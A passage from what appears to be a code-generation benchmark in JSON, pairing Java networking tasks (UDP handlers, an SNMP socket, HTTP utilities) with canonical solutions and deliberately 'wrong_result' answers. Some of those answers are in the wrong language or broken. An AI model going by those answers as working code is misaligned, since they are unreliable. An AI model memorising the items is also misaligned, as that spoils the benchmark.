mThread.interrupt();\n        }\n    }\n\n    public interface ResponseHandler {\n        void onResponse(String response);\n        void onError(String errorMessage);\n    }\n}"
  },
  {
    "Task_id": 606,
    "Instruction": "Task Description: Create a Java class for handling UDP communication that can both send and receive datagram packets, with proper socket management and error handling.\n\nClass Description: The UdpCommunicationHandler class provides a wrapper for Java's UDP socket functionality, enabling both sending and receiving of datagram packets. It manages socket lifecycle and provides status checking methods.\n\nAttributes:\n- socket: DatagramSocket - The underlying UDP socket for communication\n- bindAddress: InetSocketAddress - The address and port to which the socket is bound\n\nMethods:\n- UdpCommunicationHandler(String bindIp, int bindPort) -> void - Constructor that initializes and binds the UDP socket to the specified IP and port\n- sendData(byte[] data, String targetIp, int targetPort) -> void - Sends the provided data as a UDP packet to the specified target IP and port\n- receiveData() -> byte[] - Receives incoming UDP packet data and returns it as a byte array\n- close() -> void - Closes the UDP socket if it's open\n- isBound() -> boolean - Returns whether the socket is currently bound to an address\n- isClosed() -> boolean - Returns whether the socket is closed",
    "Canonical_solution": "import java.net.DatagramSocket;\nimport java.net.DatagramPacket;\nimport java.net.InetSocketAddress;\nimport java.net.SocketException;\nimport java.io.IOException;\n\npublic class UdpCommunicationHandler {\n    private DatagramSocket socket;\n    private InetSocketAddress bindAddress;\n\n    public UdpCommunicationHandler(String bindIp, int bindPort) throws SocketException {\n        this.bindAddress = new InetSocketAddress(bindIp, bindPort);\n        this.socket = new DatagramSocket(null);\n        this.socket.bind(this.bindAddress);\n    }\n\n    public void sendData(byte[] data, String targetIp, int targetPort) throws IOException {\n        InetSocketAddress targetAddress = new InetSocketAddress(targetIp, targetPort);\n        DatagramPacket packet = new DatagramPacket(data, data.length, targetAddress);\n        this.socket.send(packet);\n    }\n\n    public byte[] receiveData() throws IOException {\n        byte[] buffer = new byte[800];\n        DatagramPacket packet = new DatagramPacket(buffer, buffer.length);\n        this.socket.receive(packet);\n        return packet.getData();\n    }\n\n    public void close() {\n        if (this.socket != null && !this.socket.isClosed()) {\n            this.socket.close();\n        }\n    }\n\n    public boolean isBound() {\n        return this.socket != null && this.socket.isBound();\n    }\n\n    public boolean isClosed() {\n        return this.socket == null || this.socket.isClosed();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 2,
    "wrong_result": "public class UdpCommunicationHandler {\n    private DatagramSocket socket;\n    private InetSocketAddress bindAddress;\n    private boolean isClosed;\n\n    public UdpCommunicationHandler(String bindIp, int bindPort) throws IOException {\n        socket = new DatagramSocket();\n        bindAddress = new InetSocketAddress(bindIp, bindPort);\n        socket.bind(bindAddress);\n        isClosed = false;\n    }\n\n    public void sendData(byte[] data, String targetIp, int targetPort) throws IOException {\n        DatagramPacket packet = new DatagramPacket(data, data.length);\n        InetSocketAddress target = new InetSocketAddress(targetIp, targetPort);\n        packet.setSocketAddress(target);\n        socket.send(packet);\n    }\n\n    public byte[] receiveData() throws IOException {\n        byte[] buffer = new byte[1024];\n        DatagramPacket packet = new DatagramPacket(buffer, buffer.length);\n        socket.receive(packet);\n        byte[] receivedData = new byte[packet.getLength()];\n        System.arraycopy(packet.getData(), 0, receivedData, 0, packet.getLength());\n        return receivedData;\n    }\n\n    public void close() {\n        if (!isClosed) {\n            socket.close();\n            isClosed = true;\n        }\n    }\n\n    public boolean isBound() {\n        return bindAddress != null;\n    }\n\n    public boolean isClosed() {\n        return isClosed;\n    }\n}"
  },
  {
    "Task_id": 607,
    "Instruction": "Task Description: Implement a UDP-based communication handler class that can act as a server to receive files and process initialization messages from clients.\n\nClass Description: The UdpCommunicationHandler class provides functionality to create a UDP server that listens on a specified port for incoming messages. It handles two types of messages: initialization messages for receiver setup and file information messages. The class manages the UDP socket lifecycle and includes methods for processing received messages.\n\nAttributes:\n- mDatagramSocket: DatagramSocket - The UDP socket used for communication\n\nMethods:\n- startFileReceiverServer(int serverPort) -> void - Starts the UDP server on the specified port to receive messages. Continuously listens for incoming packets and processes them based on their content.\n  Input: serverPort - int - The port number to bind the server to\n  Output: None (throws Exception if socket operations fail)\n  \n- handleReceiverInit(InetAddress inetAddress, int port) -> void - Handles the receiver initialization logic when an initialization message is received.\n  Input: \n    inetAddress - InetAddress - The client's IP address\n    port - int - The client's port number\n  Output: None\n  \n- parseFileInfo(String msg) -> void - Parses and processes file information messages received from clients.\n  Input: msg - String - The received message containing file information\n  Output: None\n  \n- closeSocket() -> void - Properly closes and cleans up the UDP socket resources.\n  Input: None\n  Output: None",
    "Canonical_solution": "import java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\n\npublic class UdpCommunicationHandler {\n\n    private DatagramSocket mDatagramSocket;\n\n    public void startFileReceiverServer(int serverPort) throws Exception {\n        mDatagramSocket = new DatagramSocket(serverPort);\n        byte[] receiveData = new byte[1024];\n        \n        while(true) {\n            DatagramPacket receivePacket = new DatagramPacket(receiveData, receiveData.length);\n            mDatagramSocket.receive(receivePacket);\n            String msg = new String(receivePacket.getData()).trim();\n            InetAddress inetAddress = receivePacket.getAddress();\n            int port = receivePacket.getPort();\n            \n            if(msg != null && msg.startsWith(Constant.MSG_FILE_RECEIVER_INIT)) {\n                handleReceiverInit(inetAddress, port);\n            } else {\n                parseFileInfo(msg);\n            }\n        }\n    }\n\n    private void handleReceiverInit(InetAddress inetAddress, int port) {\n        // Handle receiver initialization logic\n    }\n\n    private void parseFileInfo(String msg) {\n        // Parse file information\n    }\n\n    public void closeSocket() {\n        if(mDatagramSocket != null) {\n            mDatagramSocket.disconnect();\n            mDatagramSocket.close();\n            mDatagramSocket = null;\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 2,
    "wrong_result": "public class UdpCommunicationHandler {\n    private DatagramSocket mDatagramSocket;\n\n    public void startFileReceiverServer(int serverPort) throws Exception {\n        mDatagramSocket = new DatagramSocket(serverPort);\n        byte[] buffer = new byte[1024];\n        while (true) {\n            DatagramPacket packet = new DatagramPacket(buffer, buffer.length);\n            mDatagramSocket.receive(packet);\n            String message = new String(packet.getData(), 0, packet.getLength());\n            if (message.startsWith(\"INIT_\")) {\n                handleReceiverInit(packet.getAddress(), packet.getPort());\n            } else if (message.startsWith(\"FILEINFO_\")) {\n                parseFileInfo(message);\n            }\n        }\n    }\n\n    public void handleReceiverInit(InetAddress inetAddress, int port) {\n        System.out.println(\"Receiver init from \" + inetAddress.getHostAddress() + \":\" + port);\n    }\n\n    public void parseFileInfo(String msg) {\n        System.out.println(\"Parsing file info: \" + msg);\n    }\n\n    public void closeSocket() {\n        if (mDatagramSocket != null) {\n            mDatagramSocket.close();\n        }\n    }\n}"
  },
  {
    "Task_id": 609,
    "Instruction": "Task Description: Implement a UDP client function that sends a message to a server and waits for a response.\n\nFunction Description: The function establishes a UDP connection, sends a predefined message (\"hello world\") to a specified server (localhost on port 9876), waits for a response, prints the server's reply, and then closes the connection. This demonstrates basic UDP client-server communication.\n\nInput: None (The target address and port are hardcoded as \"localhost\" and 9876 respectively)\n\nOutput: None (The function prints the server's response to the console but doesn't return any value)",
    "Canonical_solution": "import java.net.DatagramSocket;\nimport java.net.InetAddress;\nimport java.net.DatagramPacket;\n\nprivate void sendWifiInfoToClient() throws Exception {\n    DatagramSocket clientSocket = new DatagramSocket();\n    InetAddress IPAddress = InetAddress.getByName(\"localhost\");\n    byte[] sendData = new byte[1024];\n    byte[] receiveData = new byte[1024];\n    String sentence = \"hello world\";\n    sendData = sentence.getBytes();\n    DatagramPacket sendPacket = new DatagramPacket(sendData, sendData.length, IPAddress, 9876);\n    clientSocket.send(sendPacket);\n    DatagramPacket receivePacket = new DatagramPacket(receiveData, receiveData.length);\n    clientSocket.receive(receivePacket);\n    String modifiedSentence = new String(receivePacket.getData());\n    System.out.println(\"FROM SERVER:\" + modifiedSentence);\n    clientSocket.close();\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 2,
    "wrong_result": "import socket\n\ndef udp_client():\n    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    message = \"hello world\".encode()\n    server_address = (\"localhost\", 9876)\n    sock.sendto(message, server_address)\n    data, addr = sock.recvfrom(1024)\n    print(\"Server reply:\", data.decode())\n    sock.close()"
  },
  {
    "Task_id": 61,
    "Instruction": "Task Description: Create a Java utility class for making HTTP requests (GET and POST) using HttpURLConnection, with proper error handling and response processing.\n\nClass Description: HttpUtils is a utility class that provides static methods for making HTTP requests. It handles both GET and POST requests, manages connection settings, processes responses, and includes custom error handling for HTTP errors.\n\nAttributes:\n\nError.responseCode: int - The HTTP response code when an error occurs\nError.output: String - The error response body from the server\n\nMethods:\n\npost: post(String request) -> String - Makes a POST request to the specified URL with an empty body\npost: post(String request, String body) -> String - Makes a POST request to the specified URL with the given body\nget: get(String request) -> String - Makes a GET request to the specified URL with default timeout\nget: get(String request, IOUtils.LineRead callback, int timeout) -> String - Makes a GET request to the specified URL with custom timeout and response line callback\nhandleResponse: handleResponse(HttpURLConnection connection, IOUtils.LineRead callback) -> String - Internal method to process the HTTP response\nError.toString: toString() -> String - Returns a string representation of the error including response code and output",
    "Canonical_solution": "import java.io.DataOutputStream;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class HttpUtils {\n\n    public static String post(String request) throws Exception {\n        return post(request, \"\");\n    }\n\n    public static String post(String request, String body) throws Exception {\n        URL url = new URL(request);\n        HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n        try {\n            connection.setDoOutput(true);\n            connection.setDoInput(true);\n            connection.setInstanceFollowRedirects(false);\n            connection.setRequestMethod(\"POST\");\n            connection.setRequestProperty(\"Content-Type\", \"application/x-www-form-urlencoded\");\n            connection.setRequestProperty(\"charset\", \"utf-8\");\n            connection.setRequestProperty(\"Content-Length\", \"\" + Integer.toString(body.getBytes().length));\n            connection.setUseCaches(false);\n            connection.setConnectTimeout(60000);\n            connection.setReadTimeout(60000);\n            DataOutputStream wr = new DataOutputStream(connection.getOutputStream());\n            try {\n                wr.writeBytes(body);\n                wr.flush();\n            } finally {\n                wr.close();\n            }\n            return handleResponse(connection, null);\n        } finally {\n            connection.disconnect();\n        }\n    }\n\n    public static String get(String request) throws Exception {\n        return get(request, null, 3000);\n    }\n\n    public static String get(String request, IOUtils.LineRead callback, int timeout) throws Exception {\n        URL url = new URL(request);\n        HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n        try {\n            connection.setInstanceFollowRedirects(false);\n            connection.setRequestMethod(\"GET\");\n            connection.setUseCaches(false);\n            if (timeout > 0) {\n                connection.setConnectTimeout(timeout);\n                connection.setReadTimeout(timeout);\n            }\n            return handleResponse(connection, callback);\n        } finally {\n            connection.disconnect();\n        }\n    }\n\n    private static String handleResponse(HttpURLConnection connection, IOUtils.LineRead callback) throws Exception {\n        int responseCode = connection.getResponseCode();\n        if (responseCode >= 200 && responseCode < 300) {\n            return IOUtils.readAll(connection.getInputStream(), callback);\n        } else {\n            throw new Error(responseCode, IOUtils.readAll(connection.getErrorStream(), callback));\n        }\n    }\n\n    public static class Error extends RuntimeException {\n        public final int responseCode;\n        public final String output;\n\n        public Error(int responseCode, String output) {\n            this.responseCode = responseCode;\n            this.output = output;\n        }\n\n        @Override\n        public String toString() {\n            return \"Error{\" +\n                    \"responseCode=\" + responseCode +\n                    \", output='\" + output + '\\'' +\n                    '}';\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "public class HttpUtils {\n    public static int responseCode;\n    public static String output;\n\n    public static String toString() {\n        return \"Error{\" +\n               \"responseCode=\" + responseCode +\n               \", output='\" + output + '\\'' +\n               '}';\n    }\n\n    public static String post(String url) throws IOException {\n        return post(url, null);\n    }\n\n    public static String post(String url, String body) throws IOException {\n        HttpURLConnection connection = (HttpURLConnection) new URL(url).openConnection();\n        connection.setRequestMethod(\"POST\");\n        connection.setDoOutput(true);\n        if (body != null) {\n            try (OutputStream os = connection.getOutputStream()) {\n                os.write(body.getBytes(StandardCharsets.UTF_8));\n            }\n        }\n        int rc = connection.getResponseCode();\n        if (rc >= 400) {\n            responseCode = rc;\n            output = \"Error response: \" + rc;\n            throw new IOException(output);\n        }\n        try (BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()))) {\n            StringBuilder sb = new StringBuilder();\n            String line;\n            while ((line = br.readLine()) != null) {\n                sb.append(line);\n            }\n            return sb.toString();\n        }\n    }\n\n    public static String get(String url) throws IOException {\n        return get(url, null, 5000);\n    }\n\n    public static String get(String url, IOUtils.LineRead callback, int timeout) throws IOException {\n        HttpURLConnection connection = (HttpURLConnection) new URL(url).openConnection();\n        connection.setRequestMethod(\"GET\");\n        connection.setConnectTimeout(timeout);\n        connection.setReadTimeout(timeout);\n        int rc = connection.getResponseCode();\n        if (rc >= 400) {\n            responseCode = rc;\n            output = \"Error response: \" + rc;\n            throw new IOException(output);\n        }\n        return handleResponse(connection, callback);\n    }\n\n    private static String handleResponse(HttpURLConnection connection, IOUtils.LineRead callback) throws IOException {\n        int rc = connection.getResponseCode();\n        if (rc >= 400) {\n            responseCode = rc;\n            output = \"Error response: \" + rc;\n            throw new IOException(output);\n        }\n        StringBuilder sb = new StringBuilder();\n        try (BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()))) {\n            String line;\n            while ((line = reader.readLine()) != null) {\n                callback.readLine(line);\n                sb.append(line);\n            }\n        }\n        return sb.toString();\n    }\n\n    public static class IOUtils {\n        public interface LineRead {\n            void readLine(String line);\n        }\n    }\n}"
  },
  {
    "Task_id": 611,
    "Instruction": "Task Description: Implement a UDP communication handler class that facilitates sending UDP messages and manages socket resources.\n\nClass Description: The UdpCommunicationHandler class provides functionality for sending UDP messages to a specified IP address and port, and includes methods for proper socket cleanup. It's designed for scenarios where a client needs to send confirmation messages to a server.\n\nAttributes:\n- mDatagramSocket: DatagramSocket - The UDP socket used for communication\n\nMethods:\n- sendFileReceiverInitSuccessMsg(IpPortInfo ipPortInfo) -> void - Sends a predefined success message (MSG_FILE_RECEIVER_INIT_SUCCESS) to the specified IP address and port. The socket is created on a port number that's one higher than the target port. Throws Exception if communication fails.\n- closeSocket() -> void - Closes and cleans up the DatagramSocket resource if it exists. This method should be called when the communication is complete to release system resources.\n\nInput:\n- For sendFileReceiverInitSuccessMsg: IpPortInfo object containing target IP address (InetAddress) and port number (int)\n- For closeSocket: None\n\nOutput:\n- For sendFileReceiverInitSuccessMsg: None (void), but sends UDP packet to specified destination\n- For closeSocket: None (void)",
    "Canonical_solution": "import android.util.Log;\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\n\npublic class UdpCommunicationHandler {\n    private DatagramSocket mDatagramSocket;\n\n    public void sendFileReceiverInitSuccessMsg(IpPortInfo ipPortInfo) throws Exception {\n        Log.i(\"UdpCommunicationHandler\", \"sendFileReceiverInitSuccessMsg------>>>start\");\n        mDatagramSocket = new DatagramSocket(ipPortInfo.getPort() + 1);\n        byte[] sendData = Constant.MSG_FILE_RECEIVER_INIT_SUCCESS.getBytes(BaseTransfer.UTF_8);\n        DatagramPacket sendPacket = new DatagramPacket(\n            sendData, \n            sendData.length, \n            ipPortInfo.getInetAddress(), \n            ipPortInfo.getPort()\n        );\n        mDatagramSocket.send(sendPacket);\n        Log.i(\"UdpCommunicationHandler\", \"Send Msg To FileSender######>>>\" + Constant.MSG_FILE_RECEIVER_INIT_SUCCESS);\n        Log.i(\"UdpCommunicationHandler\", \"sendFileReceiverInitSuccessMsg------>>>end\");\n    }\n\n    public void closeSocket() {\n        if (mDatagramSocket != null) {\n            mDatagramSocket.disconnect();\n            mDatagramSocket.close();\n            mDatagramSocket = null;\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 2,
    "wrong_result": "public class UdpCommunicationHandler {\n    private DatagramSocket mDatagramSocket;\n    private static final String MSG_FILE_RECEIVER_INIT_SUCCESS = \"File receiver initialized successfully.\";\n\n    public void sendFileReceiverInitSuccessMsg(IpPortInfo ipPortInfo) throws Exception {\n        int targetPort = ipPortInfo.getPort();\n        int socketPort = targetPort + 1;\n        try {\n            mDatagramSocket = new DatagramSocket(socketPort);\n        } catch (SocketException e) {\n            throw new Exception(\"Failed to create socket\", e);\n        }\n\n        byte[] data = MSG_FILE_RECEIVER_INIT_SUCCESS.getBytes();\n        InetAddress address = ipPortInfo.getInetAddress();\n        int destPort = targetPort;\n        DatagramPacket packet = new DatagramPacket(data, data.length, address, destPort);\n\n        try {\n            mDatagramSocket.send(packet);\n        } catch (IOException e) {\n            throw new Exception(\"Failed to send message\", e);\n        }\n    }\n\n    public void closeSocket() {\n        if (mDatagramSocket != null) {\n            try {\n                mDatagramSocket.close();\n            } catch (IOException e) {\n                // Handle exception, but no need to throw as per problem description\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 613,
    "Instruction": "Task Description: Create a Java class that implements a UDP socket for SNMP communication, capable of sending and receiving datagram packets asynchronously while handling errors and resource cleanup properly.\n\nClass Description: The SnmpSocket class provides UDP socket functionality for SNMP communication, managing packet transmission and reception in a separate thread. It includes methods for sending packets, checking socket validity, and proper resource cleanup. The class implements Runnable to handle incoming packets asynchronously.\n\nAttributes:\n_socket: [DatagramSocket] - The UDP socket instance for communication\n_dgramHdlr: [SnmpResponseHandler] - Handler for processing received datagrams\n_sockThread: [Thread] - Thread for asynchronous packet reception\n_buffer: [byte[]] - Buffer for storing incoming packet data\nisClosing: [boolean] - Flag indicating if the socket is being closed\n_socketPort: [int] - Port number the socket is bound to\nresponseBufSize: [int] - Size of the response buffer\n\nMethods:\nConstructor: [SnmpSocket](SnmpResponseHandler rspHdlr, InetAddress addr, int bufferSize) -> [void] - Initializes the UDP socket and starts the receiver thread\nsendPacket: [sendPacket](byte[] buff, int length, InetAddress addr, int port) -> [void] - Sends a datagram packet with specified data to given address and port\nsendPacket: [sendPacket](DatagramPacket dgrmpkt) -> [void] - Sends a prepared datagram packet\nisValid: [isValid]() -> [boolean] - Checks if the socket is in a valid state\nclose: [close]() -> [void] - Closes the socket and cleans up resources\nrun: [run]() -> [void] - Main thread method for receiving packets (implements Runnable)\nfinalize: [finalize]() -> [void] - Ensures proper cleanup when object is garbage collected\nhandleJavaError: [handleJavaError](Throwable thr) -> [void] - Handles Java errors during operation\nhandleDatagram: [handleDatagram](DatagramPacket dgrmpkt) -> [void] - Processes received datagrams using the response handler",
    "Canonical_solution": "import java.net.InetAddress;\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.SocketException;\nimport java.io.IOException;\nimport java.util.logging.Level;\n\nfinal class SnmpSocket implements java.lang.Runnable {\n\n    private DatagramSocket _socket = null;\n    private SnmpResponseHandler _dgramHdlr = null;\n    private Thread _sockThread = null;\n    private byte[] _buffer = null;\n    private transient boolean isClosing = false;\n\n    int _socketPort = 0;\n    int responseBufSize = 1024;\n\n    public SnmpSocket(SnmpResponseHandler rspHdlr, InetAddress addr, int bufferSize) throws SocketException {\n        _socket = new DatagramSocket(0, addr);\n        _socketPort = _socket.getLocalPort();\n        responseBufSize = bufferSize;\n        _buffer = new byte[responseBufSize];\n        _dgramHdlr = rspHdlr;\n        _sockThread = new Thread(this, \"SnmpSocket\");\n        _sockThread.start();\n    }\n\n    public synchronized void sendPacket(byte[] buff, int length, InetAddress addr, int port) throws IOException {\n        DatagramPacket dgrmpkt = new DatagramPacket(buff, length, addr, port);\n        sendPacket(dgrmpkt);\n    }\n\n    public synchronized void sendPacket(DatagramPacket dgrmpkt) throws IOException {\n        if (isValid()) {\n            _socket.send(dgrmpkt);\n        } else {\n            throw new IOException(\"Invalid state of SNMP datagram socket.\");\n        }\n    }\n\n    public synchronized boolean isValid() {\n        return _socket != null && _sockThread != null && _sockThread.isAlive();\n    }\n\n    public synchronized void close() {\n        isClosing = true;\n        if (_socket != null) {\n            _socket.close();\n            _socket = null;\n        }\n        if (_sockThread != null && _sockThread.isAlive()) {\n            _sockThread.interrupt();\n            try {\n                _sockThread.join();\n            } catch (InterruptedException e) {\n            }\n            _sockThread = null;\n        }\n    }\n\n    @Override\n    public void run() {\n        Thread.currentThread().setPriority(8);\n        while (true) {\n            try {\n                DatagramPacket dgrmpkt = new DatagramPacket(_buffer, _buffer.length);\n                _socket.receive(dgrmpkt);\n                if (isClosing)\n                    break;\n                if (dgrmpkt.getLength() <= 0)\n                    continue;\n                handleDatagram(dgrmpkt);\n                if (isClosing)\n                    break;\n            } catch (IOException io) {\n                if (isClosing) {\n                    break;\n                }\n            } catch (Exception e) {\n                if (isClosing) {\n                    break;\n                }\n            } catch (ThreadDeath d) {\n                close();\n                throw d;\n            } catch (Error err) {\n                handleJavaError(err);\n            }\n        }\n    }\n\n    @Override\n    protected synchronized void finalize() {\n        close();\n    }\n\n    private synchronized void handleJavaError(Throwable thr) {\n        if (thr instanceof OutOfMemoryError) {\n            Thread.yield();\n            return;\n        }\n        if (_socket != null) {\n            _socket.close();\n            _socket = null;\n        }\n        Thread.yield();\n    }\n\n    private synchronized void handleDatagram(DatagramPacket dgrmpkt) {\n        _dgramHdlr.processDatagram(dgrmpkt);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 2,
    "wrong_result": "public class SnmpSocket implements Runnable {\n    private DatagramSocket _socket;\n    private SnmpResponseHandler _dgramHdlr;\n    private Thread _sockThread;\n    private byte[] _buffer;\n    private boolean isClosing;\n    private int _socketPort;\n    private int responseBufSize;\n\n    public SnmpSocket(SnmpResponseHandler rspHdlr, InetAddress addr, int bufferSize) {\n        _dgramHdlr = rspHdlr;\n        _buffer = new byte[bufferSize];\n        responseBufSize = bufferSize;\n        _socket = new DatagramSocket();\n        _socketPort = _socket.getLocalPort();\n        _sockThread = new Thread(this);\n        _sockThread.start();\n    }\n\n    public void sendPacket(byte[] buff, int length, InetAddress addr, int port) {\n        DatagramPacket packet = new DatagramPacket(buff, length, addr, port);\n        try {\n            _socket.send(packet);\n        } catch (IOException e) {\n            handleJavaError(e);\n        }\n    }\n\n    public void sendPacket(DatagramPacket dgrmpkt) {\n        try {\n            _socket.send(dgrmpkt);\n        } catch (IOException e) {\n            handleJavaError(e);\n        }\n    }\n\n    public boolean isValid() {\n        return _socket != null && !isClosing;\n    }\n\n    public void close() {\n        if (isValid()) {\n            isClosing = true;\n            try {\n                _socket.close();\n            } catch (IOException e) {\n                handleJavaError(e);\n            }\n            _sockThread.interrupt();\n        }\n    }\n\n    @Override\n    public void run() {\n        while (!isClosing) {\n            try {\n                DatagramPacket packet = new DatagramPacket(_buffer, _buffer.length);\n                _socket.receive(packet);\n                handleDatagram(packet);\n            } catch (IOException e) {\n                if (isClosing) {\n                    break;\n                }\n                handleJavaError(e);\n            }\n        }\n    }\n\n    protected void finalize() {\n        close();\n    }\n\n    private void handleJavaError(Throwable thr) {\n        thr.printStackTrace();\n    }\n\n    private void handleDatagram(DatagramPacket dgrmpkt) {\n        _dgramHdlr.handleDatagram(dgrmpkt);\n    }\n}"
  },
  {
    "Task_id": 614,
    "Instruction": "Task Description: Implement a UDP server function that continuously listens for incoming packets, processes the received data by converting it to uppercase, and sends the modified data back to the client.\n\nFunction Description: The function sets up a UDP server that binds to a specific port (9876) and enters an infinite loop to receive incoming packets. Upon receiving a packet, it extracts the data, converts it to uppercase, and sends the modified data back to the client's address and port. The function handles all necessary UDP communication steps including socket creation, packet reception, data processing, and response transmission.\n\nInput: None (The function takes no parameters as it binds to a fixed port and processes incoming UDP packets)\n\nOutput: None (The function does not return any value but prints received messages to the console and sends responses back to clients)",
    "Canonical_solution": "import java.net.DatagramSocket;\nimport java.net.DatagramPacket;\nimport java.net.InetAddress;\n\nprivate void receiveServerUdpInfo() throws Exception {\n    DatagramSocket serverSocket = new DatagramSocket(9876);\n    byte[] receiveData = new byte[1024];\n    byte[] sendData = new byte[1024];\n    while(true) {\n        DatagramPacket receivePacket = new DatagramPacket(receiveData, receiveData.length);\n        serverSocket.receive(receivePacket);\n        String sentence = new String(receivePacket.getData());\n        System.out.println(\"RECEIVED: \" + sentence);\n        InetAddress IPAddress = receivePacket.getAddress();\n        int port = receivePacket.getPort();\n        String capitalizedSentence = sentence.toUpperCase();\n        sendData = capitalizedSentence.getBytes();\n        DatagramPacket sendPacket = new DatagramPacket(sendData, sendData.length, IPAddress, port);\n        serverSocket.send(sendPacket);\n    }\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 2,
    "wrong_result": "import socket\n\nsock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\nsock.bind(('0.0.0.0', 9876))\n\nwhile True:\n    data, addr = sock.recvfrom(1024)\n    message = data.decode('utf-8')\n    print(f\"Received: {message}\")\n    response = message.upper()\n    sock.sendto(response.encode('utf-8'), addr)"
  },
  {
    "Task_id": 62,
    "Instruction": "Task Description: Create a function to check if a given URL is accessible and usable by sending a HEAD request and verifying the HTTP response code.\n\nFunction Description: The function checks the accessibility of a URL by attempting to establish a connection and sending a HEAD request. It returns true if the URL responds with HTTP OK (status code 200), indicating it's usable, and false otherwise (including invalid URLs or connection failures).\n\nInput: \n- url: String - The URL to be checked for accessibility.\n\nOutput: \n- boolean - Returns true if the URL is accessible (HTTP status code 200), false otherwise.",
    "Canonical_solution": "import java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic static boolean isUrlUsable(String url) {\n    if (CommonUtils.isEmpty(url)) {\n        return false;\n    }\n\n    URL urlTemp = null;\n    HttpURLConnection connt = null;\n    try {\n        urlTemp = new URL(url);\n        connt = (HttpURLConnection) urlTemp.openConnection();\n        connt.setRequestMethod(\"HEAD\");\n        int returnCode = connt.getResponseCode();\n        if (returnCode == HttpURLConnection.HTTP_OK) {\n            return true;\n        }\n    } catch (Exception e) {\n        return false;\n    } finally {\n        connt.disconnect();\n    }\n    return false;\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 16,
    "wrong_result": "import requests\n\ndef is_url_accessible(url):\n    try:\n        response = requests.head(url, timeout=5)\n        return response.status_code == 200\n    except requests.exceptions.RequestException:\n        return False"
  },
  {
    "Task_id": 63,
    "Instruction": "Task Description: Create a Java class that implements an HTTP client for sending feedback data to a remote server using HttpURLConnection.\n\nClass Description: The HttpFeedbackClient class provides functionality to send feedback content and environment information to a specified URL via HTTP POST request. It handles connection setup, parameter encoding, request sending, and response handling with appropriate callbacks for success or failure scenarios.\n\nAttributes:\ncontent: String - The feedback content to be sent to the server\nenv: String - The environment information associated with the feedback\ncallback: OnRequestCallback - The callback interface for handling request results\n\nMethods:\nsendFeedback: sendFeedback() -> void - Sends the feedback data to the server. Sets up the HTTP connection, encodes parameters, writes the request body, and processes the response. Calls onSuccess() or onFailure() on the callback object depending on the outcome.\n\nNote: The OnRequestCallback interface (not shown in the reference code) would typically contain two methods:\n- onSuccess(): Called when the request completes successfully\n- onFailure(Exception e): Called when the request fails, with the exception that occurred",
    "Canonical_solution": "import com.antfortune.freeline.idea.utils.NotificationUtils;\nimport java.io.BufferedWriter;\nimport java.io.IOException;\nimport java.io.OutputStream;\nimport java.io.OutputStreamWriter;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.net.URLEncoder;\n\npublic class HttpFeedbackClient {\n\n    private String content;\n    private String env;\n    private OnRequestCallback callback;\n\n    public HttpFeedbackClient(String content, String env, OnRequestCallback callback) {\n        this.content = content;\n        this.env = env;\n        this.callback = callback;\n    }\n\n    public void sendFeedback() {\n        try {\n            URL url = new URL(\"https://www.freelinebuild.com/api/feedback\");\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            conn.setReadTimeout(10000);\n            conn.setConnectTimeout(15000);\n            conn.setRequestMethod(\"POST\");\n            conn.setDoInput(true);\n            conn.setDoOutput(true);\n\n            StringBuilder builder = new StringBuilder();\n            builder.append(URLEncoder.encode(\"content\", \"UTF-8\"));\n            builder.append(\"=\");\n            builder.append(URLEncoder.encode(content, \"UTF-8\"));\n            builder.append(\"&\");\n            builder.append(URLEncoder.encode(\"env\", \"UTF-8\"));\n            builder.append(\"=\");\n            builder.append(URLEncoder.encode(env, \"UTF-8\"));\n\n            OutputStream os = conn.getOutputStream();\n            BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(os, \"UTF-8\"));\n            writer.write(builder.toString());\n            writer.flush();\n            writer.close();\n            os.close();\n\n            int responseCode = conn.getResponseCode();\n            if (responseCode >= 400) {\n                this.callback.onFailure(new Exception(conn.getResponseMessage()));\n            } else {\n                this.callback.onSuccess();\n            }\n            conn.disconnect();\n        } catch (IOException e) {\n            this.callback.onFailure(e);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "public interface OnRequestCallback {\n    void onSuccess();\n    void onFailure(Exception e);\n}\n\npublic class HttpFeedbackClient {\n    private String url;\n    private String content;\n    private String env;\n    private OnRequestCallback callback;\n\n    public HttpFeedbackClient(String url, String content, String env, OnRequestCallback callback) {\n        this.url = url;\n        this.content = content;\n        this.env = env;\n        this.callback = callback;\n    }\n\n    public void sendFeedback() {\n        try {\n            URL urlObj = new URL(this.url);\n            HttpURLConnection conn = (HttpURLConnection) urlObj.openConnection();\n            conn.setRequestMethod(\"POST\");\n            conn.setDoOutput(true);\n            conn.setRequestProperty(\"Content-Type\", \"application/x-www-form-urlencoded\");\n\n            String params = \"content=\" + URLEncoder.encode(this.content, StandardCharsets.UTF_8) + \n                            \"&env=\" + URLEncoder.encode(this.env, StandardCharsets.UTF_8);\n            try (OutputStream os = conn.getOutputStream()) {\n                byte[] input = params.getBytes(StandardCharsets.UTF_8);\n                os.write(input);\n            }\n\n            int responseCode = conn.getResponseCode();\n            if (responseCode == HttpURLConnection.HTTP_OK) {\n                callback.onSuccess();\n            } else {\n                callback.onFailure(new Exception(\"HTTP error code: \" + responseCode));\n            }\n        } catch (Exception e) {\n            